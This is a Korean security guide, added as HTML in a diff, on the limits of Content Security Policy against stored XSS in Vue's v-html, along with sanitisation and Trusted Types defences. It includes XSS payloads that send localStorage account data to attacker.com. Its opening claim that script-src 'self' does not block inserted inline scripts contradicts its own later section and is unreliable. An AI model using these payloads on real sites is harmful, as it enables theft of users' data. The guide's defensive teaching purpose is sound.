@@ -1,0 +1,262 @@
+<h1 id="csp와-inline으로-삽입된-xss-스크립트의-관계">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden="true" class="anchor-heading icon-link" href="#csp와-inline으로-삽입된-xss-스크립트의-관계"></a></h1>
+<h2 id="csp와-inline으로-삽입된-xss-스크립트의-관계-1">CSP와 inline으로 삽입된 XSS 스크립트의 관계<a aria-hidden="true" class="anchor-heading icon-link" href="#csp와-inline으로-삽입된-xss-스크립트의-관계-1"></a></h2>
+<h3 id="핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가">핵심 질문: "inline으로 XSS script를 넣으면 CSP은 무용지물 아닌가?"<a aria-hidden="true" class="anchor-heading icon-link" href="#핵심-질문-inline으로-xss-script를-넣으면-csp은-무용지물-아닌가"></a></h3>
+<p>답변: <strong>맞습니다, 부분적으로 무용지물이 될 수 있습니다.</strong></p>
+<h2 id="1-인라인-스크립트와-csp의-한계">1. 인라인 스크립트와 CSP의 한계<a aria-hidden="true" class="anchor-heading icon-link" href="#1-인라인-스크립트와-csp의-한계"></a></h2>
+<h3 id="csp가-막을-수-없는-경우">CSP가 막을 수 없는 경우<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-막을-수-없는-경우"></a></h3>
+<pre class="language-html"><code class="language-html"><span class="token comment">&#x3C;!-- v-html로 직접 삽입된 악성 스크립트 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>div</span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token comment">// 이 스크립트는 이미 DOM에 삽입되어 실행됨</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"https://attacker.com/steal"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+      method<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+      body<span class="token operator">:</span> <span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">"accountInfo"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;/</span>div</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>CSP가 <code>script-src 'self'</code>로 설정되어 있어도, <strong>이미 DOM에 삽입된 인라인 스크립트</strong>는 차단되지 않습니다.</p>
+<h2 id="2-csp가-효과적인-경우">2. CSP가 효과적인 경우<a aria-hidden="true" class="anchor-heading icon-link" href="#2-csp가-효과적인-경우"></a></h2>
+<p>하지만 CSP는 여전히 중요한 방어층입니다:</p>
+<h3 id="csp-설정-예시">CSP 설정 예시<a aria-hidden="true" class="anchor-heading icon-link" href="#csp-설정-예시"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
+  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
+  script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>  <span class="token comment">// 인라인 스크립트 차단</span>
+  connect<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span> <span class="token comment">// 외부 서버 연결 차단</span>
+</code></pre>
+<h3 id="csp가-차단하는-것들">CSP가 차단하는 것들<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-차단하는-것들"></a></h3>
+<ul>
+<li>❌ <code>&#x3C;script src="https://evil.com/malicious.js"></code> - 외부 스크립트 로드</li>
+<li>❌ <code>eval()</code>, <code>Function()</code> 같은 동적 코드 실행</li>
+<li>❌ <code>fetch('https://attacker.com')</code> - 외부 서버로 데이터 전송</li>
+<li>❌ 이벤트 핸들러 속성 (<code>onclick</code>, <code>onerror</code> 등)</li>
+</ul>
+<h2 id="3-실제-공격-시나리오에서-csp의-역할">3. 실제 공격 시나리오에서 CSP의 역할<a aria-hidden="true" class="anchor-heading icon-link" href="#3-실제-공격-시나리오에서-csp의-역할"></a></h2>
+<pre class="language-html"><code class="language-html"><span class="token comment">&#x3C;!-- 공격자가 삽입한 XSS --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&#x3C;</span>img</span>
+  <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span>
+  <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'//attacker.com?c='</span><span class="token operator">+</span><span class="token dom variable">localStorage</span><span class="token punctuation">.</span><span class="token method function property-access">getItem</span><span class="token punctuation">(</span><span class="token string">'accountInfo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span>
+<span class="token punctuation">/></span></span>
+</code></pre>
+<h3 id="csp가-있을-때-차단되는-것들">CSP가 있을 때 차단되는 것들<a aria-hidden="true" class="anchor-heading icon-link" href="#csp가-있을-때-차단되는-것들"></a></h3>
+<ul>
+<li><code>img-src 'self'</code> → 외부 이미지 로드 차단</li>
+<li><code>connect-src 'self'</code> → attacker.com으로 fetch 차단</li>
+<li><code>script-src 'self'</code> → onerror 인라인 이벤트 핸들러 차단</li>
+</ul>
+<h2 id="4-올바른-방어-전략-defense-in-depth">4. 올바른 방어 전략: Defense in Depth<a aria-hidden="true" class="anchor-heading icon-link" href="#4-올바른-방어-전략-defense-in-depth"></a></h2>
+<p>단일 방어 메커니즘에 의존하지 않고 <strong>다층 방어</strong>가 필요합니다:</p>
+<h3 id="1단계-입력-검증-서버-측">1단계: 입력 검증 (서버 측)<a aria-hidden="true" class="anchor-heading icon-link" href="#1단계-입력-검증-서버-측"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// 주의: 기본적인 예시 - 실제로는 불완전함</span>
+<span class="token keyword">function</span> <span class="token function">validateInput</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token comment">// HTML 태그 제거 또는 이스케이프</span>
+  <span class="token keyword control-flow">return</span> content<span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">&#x3C;script[^>]*>.*?&#x3C;\/script></span><span class="token regex-delimiter">/</span><span class="token regex-flags">gi</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+  <span class="token comment">// ⚠️ 이 방법은 &#x3C;ScRiPt>, &#x3C;script/src=...> 같은 변형을 막지 못함</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// OWASP 권장: 전문 라이브러리 사용</span>
+<span class="token keyword module">import</span> <span class="token imports">validator</span> <span class="token keyword module">from</span> <span class="token string">"validator"</span>
+<span class="token keyword module">import</span> <span class="token imports">xss</span> <span class="token keyword module">from</span> <span class="token string">"xss"</span>
+
+<span class="token keyword">function</span> <span class="token function">secureValidateInput</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token comment">// HTML 인코딩</span>
+  <span class="token keyword">const</span> encoded <span class="token operator">=</span> validator<span class="token punctuation">.</span><span class="token method function property-access">escape</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+  <span class="token comment">// 또는 XSS 필터링 라이브러리 사용</span>
+  <span class="token keyword control-flow">return</span> <span class="token function">xss</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>추가 권장사항:</strong></p>
+<ul>
+<li>WAF (Web Application Firewall) 도입 고려</li>
+<li>OWASP AntiSamy, ESAPI 등 검증된 라이브러리 사용</li>
+</ul>
+<h3 id="2단계-출력-시-sanitization">2단계: 출력 시 Sanitization<a aria-hidden="true" class="anchor-heading icon-link" href="#2단계-출력-시-sanitization"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token keyword module">import</span> <span class="token imports"><span class="token maybe-class-name">DOMPurify</span></span> <span class="token keyword module">from</span> <span class="token string">"dompurify"</span>
+
+<span class="token keyword module">export</span> <span class="token keyword module">default</span> <span class="token punctuation">{</span>
+  computed<span class="token operator">:</span> <span class="token punctuation">{</span>
+    <span class="token function">safeContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword control-flow">return</span> <span class="token maybe-class-name">DOMPurify</span><span class="token punctuation">.</span><span class="token method function property-access">sanitize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">userContent</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token constant">ALLOWED_TAGS</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"u"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"br"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token constant">ALLOWED_ATTR</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="3단계-엄격한-csp-설정">3단계: 엄격한 CSP 설정<a aria-hidden="true" class="anchor-heading icon-link" href="#3단계-엄격한-csp-설정"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// Nonce 기반 CSP (동적 콘텐츠에 적합)</span>
+<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
+  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'none'</span><span class="token punctuation">;</span>
+  script<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'nonce-random123'</span><span class="token punctuation">;</span>  <span class="token comment">// 각 요청마다 새로운 nonce 생성</span>
+  style<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'unsafe-inline'</span><span class="token punctuation">;</span>
+  img<span class="token operator">-</span>src <span class="token string">'self'</span> data<span class="token operator">:</span><span class="token punctuation">;</span>
+  connect<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
+  frame<span class="token operator">-</span>ancestors <span class="token string">'none'</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Hash 기반 CSP (정적 콘텐츠에 적합)</span>
+<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
+  script<span class="token operator">-</span>src <span class="token string">'self'</span> <span class="token string">'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='</span><span class="token punctuation">;</span>
+  <span class="token comment">// 특정 인라인 스크립트의 SHA-256 해시만 허용</span>
+</code></pre>
+<p><strong>Nonce vs Hash:</strong></p>
+<ul>
+<li><strong>Nonce</strong>: 매 요청마다 서버가 생성하는 랜덤 값. Stored XSS 시 공격자가 nonce를 예측할 수 없어 효과적</li>
+<li><strong>Hash</strong>: 정적 인라인 스크립트의 해시값. 변경되지 않는 코드에 적합</li>
+</ul>
+<h3 id="3-1단계-csp-report-only-모드로-테스트">3-1단계: CSP Report-Only 모드로 테스트<a aria-hidden="true" class="anchor-heading icon-link" href="#3-1단계-csp-report-only-모드로-테스트"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// 프로덕션 배포 전 테스트</span>
+<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">-</span><span class="token maybe-class-name">Report</span><span class="token operator">-</span><span class="token maybe-class-name">Only</span><span class="token operator">:</span>
+  <span class="token keyword module">default</span><span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
+  script<span class="token operator">-</span>src <span class="token string">'self'</span><span class="token punctuation">;</span>
+  report<span class="token operator">-</span>uri <span class="token operator">/</span>csp<span class="token operator">-</span>violation<span class="token operator">-</span>report<span class="token punctuation">;</span>
+  <span class="token comment">// CSP 위반 시 차단하지 않고 보고만 함</span>
+</code></pre>
+<h2 id="5-v-html의-위험성과-대안">5. v-html의 위험성과 대안<a aria-hidden="true" class="anchor-heading icon-link" href="#5-v-html의-위험성과-대안"></a></h2>
+<h3 id="위험한-코드">위험한 코드<a aria-hidden="true" class="anchor-heading icon-link" href="#위험한-코드"></a></h3>
+<pre class="language-vue"><code class="language-vue">&#x3C;div v-html="notice.content">&#x3C;/div>
+</code></pre>
+<h3 id="안전한-대안">안전한 대안<a aria-hidden="true" class="anchor-heading icon-link" href="#안전한-대안"></a></h3>
+<pre class="language-vue"><code class="language-vue">&#x3C;!-- 1. 텍스트로만 렌더링 -->
+&#x3C;div v-text="notice.content">&#x3C;/div>
+
+&#x3C;!-- 2. DOMPurify로 정화된 HTML -->
+&#x3C;div v-html="sanitizedContent">&#x3C;/div>
+
+&#x3C;!-- 3. Markdown 파서 사용 (사용자 콘텐츠를 안전하게) -->
+&#x3C;template>
+  &#x3C;div v-html="parsedMarkdown">&#x3C;/div>
+&#x3C;/template>
+
+&#x3C;script>
+import marked from "marked"
+import DOMPurify from "dompurify"
+
+export default {
+  computed: {
+    parsedMarkdown() {
+      // Markdown을 HTML로 변환 후 정화
+      const rawHtml = marked.parse(this.userContent)
+      return DOMPurify.sanitize(rawHtml)
+    },
+  },
+}
+&#x3C;/script>
+
+&#x3C;!-- 4. 코드 하이라이팅이 필요한 경우 -->
+&#x3C;script>
+import hljs from "highlight.js"
+import DOMPurify from "dompurify"
+
+// DOMPurify 훅 추가로 코드 블록 안전하게 처리
+DOMPurify.addHook("afterSanitizeAttributes", (node) => {
+  if (node.tagName === "CODE") {
+    hljs.highlightElement(node)
+  }
+})
+&#x3C;/script>
+</code></pre>
+<h2 id="6-최신-보안-트렌드-csp-level-3-trusted-types">6. 최신 보안 트렌드: CSP Level 3 Trusted Types<a aria-hidden="true" class="anchor-heading icon-link" href="#6-최신-보안-트렌드-csp-level-3-trusted-types"></a></h2>
+<h3 id="trusted-types를-사용한-xss-완화">Trusted Types를 사용한 XSS 완화<a aria-hidden="true" class="anchor-heading icon-link" href="#trusted-types를-사용한-xss-완화"></a></h3>
+<pre class="language-javascript"><code class="language-javascript"><span class="token comment">// CSP에 Trusted Types 정책 추가</span>
+<span class="token maybe-class-name">Content</span><span class="token operator">-</span><span class="token maybe-class-name">Security</span><span class="token operator">-</span><span class="token maybe-class-name">Policy</span><span class="token operator">:</span>
+  require<span class="token operator">-</span>trusted<span class="token operator">-</span>types<span class="token operator">-</span><span class="token keyword control-flow">for</span> <span class="token string">'script'</span><span class="token punctuation">;</span>
+  trusted<span class="token operator">-</span>types myPolicy<span class="token punctuation">;</span>
+
+<span class="token comment">// JavaScript에서 Trusted Types 정책 생성</span>
+<span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">trustedTypes</span> <span class="token operator">&#x26;&#x26;</span> trustedTypes<span class="token punctuation">.</span><span class="token property-access">createPolicy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> myPolicy <span class="token operator">=</span> trustedTypes<span class="token punctuation">.</span><span class="token method function property-access">createPolicy</span><span class="token punctuation">(</span><span class="token string">'myPolicy'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+    <span class="token function-variable function">createHTML</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span>
+      <span class="token comment">// DOMPurify로 정화 후 TrustedHTML 반환</span>
+      <span class="token keyword control-flow">return</span> <span class="token maybe-class-name">DOMPurify</span><span class="token punctuation">.</span><span class="token method function property-access">sanitize</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+    <span class="token function-variable function">createScript</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token arrow operator">=></span> <span class="token punctuation">{</span>
+      <span class="token comment">// 스크립트는 완전히 차단</span>
+      <span class="token keyword control-flow">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Scripts not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// Vue.js와 결합</span>
+<span class="token keyword module">export</span> <span class="token keyword module">default</span> <span class="token punctuation">{</span>
+  <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Trusted Types가 적용되면 innerHTML 직접 할당이 차단됨</span>
+    <span class="token comment">// this.$el.innerHTML = userContent; // ❌ 차단됨</span>
+
+    <span class="token comment">// 정책을 통해서만 가능</span>
+    <span class="token keyword control-flow">if</span> <span class="token punctuation">(</span><span class="token dom variable">window</span><span class="token punctuation">.</span><span class="token property-access">myPolicy</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token property-access">$el</span><span class="token punctuation">.</span><span class="token property-access">innerHTML</span> <span class="token operator">=</span> myPolicy<span class="token punctuation">.</span><span class="token method function property-access">createHTML</span><span class="token punctuation">(</span>userContent<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><strong>장점:</strong></p>
+<ul>
+<li>DOM XSS sink(innerHTML, outerHTML 등)를 근본적으로 차단</li>
+<li>Vue.js의 v-html도 Trusted Types 정책 적용 가능</li>
+<li>브라우저 레벨에서 XSS 방지</li>
+</ul>
+<h2 id="결론">결론<a aria-hidden="true" class="anchor-heading icon-link" href="#결론"></a></h2>
+<h3 id="csp만으로는-불충분하지만-여전히-중요합니다">CSP만으로는 불충분하지만, 여전히 중요합니다<a aria-hidden="true" class="anchor-heading icon-link" href="#csp만으로는-불충분하지만-여전히-중요합니다"></a></h3>
+<ol>
+<li>
+<p><strong>CSP의 한계</strong>:</p>
+<ul>
+<li>Stored XSS로 이미 삽입된 인라인 스크립트는 막기 어려움</li>
+<li>특히 <code>unsafe-inline</code>을 허용하면 거의 무용지물</li>
+</ul>
+</li>
+<li>
+<p><strong>그래도 CSP가 필요한 이유</strong>:</p>
+<ul>
+<li>외부 리소스 로드 차단</li>
+<li>데이터 유출 경로 차단</li>
+<li>공격의 영향 범위 제한</li>
+</ul>
+</li>
+<li>
+<p><strong>올바른 접근 방법</strong>:</p>
+<ul>
+<li><strong>입력 검증</strong> (서버 측) - OWASP 권장 라이브러리 사용</li>
+<li><strong>출력 인코딩/Sanitization</strong> (클라이언트 측)</li>
+<li><strong>엄격한 CSP</strong> (추가 방어층) - Nonce/Hash 활용</li>
+<li><strong>v-html 사용 최소화</strong> - Markdown 파서 등 대안 활용</li>
+<li><strong>Trusted Types</strong> (최신 브라우저) - DOM XSS 근본 차단</li>
+</ul>
+</li>
+</ol>
+<h2 id="보안-체크리스트">보안 체크리스트<a aria-hidden="true" class="anchor-heading icon-link" href="#보안-체크리스트"></a></h2>
+<h3 id="필수-구현-사항">필수 구현 사항<a aria-hidden="true" class="anchor-heading icon-link" href="#필수-구현-사항"></a></h3>
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> CSP (Content Security Policy) 설정
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> Nonce 또는 Hash 기반 정책 적용</li>
+<li class="task-list-item"><input type="checkbox" disabled> Report-Only 모드로 테스트 후 적용</li>
+</ul>
+</li>
+<li class="task-list-item"><input type="checkbox" checked disabled> <code>v-html</code> 사용 위치 전수 검사</li>
+<li class="task-list-item"><input type="checkbox" disabled> 서버 측 입력 검증
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> OWASP 권장 라이브러리 (validator.js, xss 등) 사용</li>
+<li class="task-list-item"><input type="checkbox" disabled> WAF 도입 검토</li>
+</ul>
+</li>
+<li class="task-list-item"><input type="checkbox" disabled> 클라이언트 측 Sanitization
+<ul class="contains-task-list">
+<li class="task-list-item"><input type="checkbox" disabled> DOMPurify 라이브러리 적용</li>
+<li class="task-list-item"><input type="checkbox" disabled> Markdown 파서 사용 시 정화 적용</li>
+</ul>
+</li>
+<li class="task-list-item"><input type="checkbox" disabled> CSP Level 3 Trusted Types 도입 (모던 브라우저)</li>
+<li class="task-list-item"><input type="checkbox" checked disabled> HttpOnly 쿠키 사용 고려 (CSRF 복잡도 vs localStorage)</li>
+</ul>
+<h3 id="권장-구현-순서">권장 구현 순서<a aria-hidden="true" class="anchor-heading icon-link" href="#권장-구현-순서"></a></h3>
+<ol>
+<li><strong>즉시</strong>: v-html 제거 또는 DOMPurify 적용</li>
+<li><strong>단기</strong>: 서버 측 입력 검증 강화</li>
+<li><strong>중기</strong>: CSP Report-Only 모드 테스트</li>
+<li><strong>장기</strong>: Trusted Types 도입</li>
+</ol>
+<blockquote>
+<p><strong>핵심</strong>: v-html을 제거하거나 Sanitization을 적용하는 것이 CSP보다 더 근본적인 해결책입니다. CSP는 추가적인 방어층으로 활용해야 합니다. <strong>Defense in Depth</strong> 전략으로 다층 방어를 구축하세요.</p>
+</blockquote>
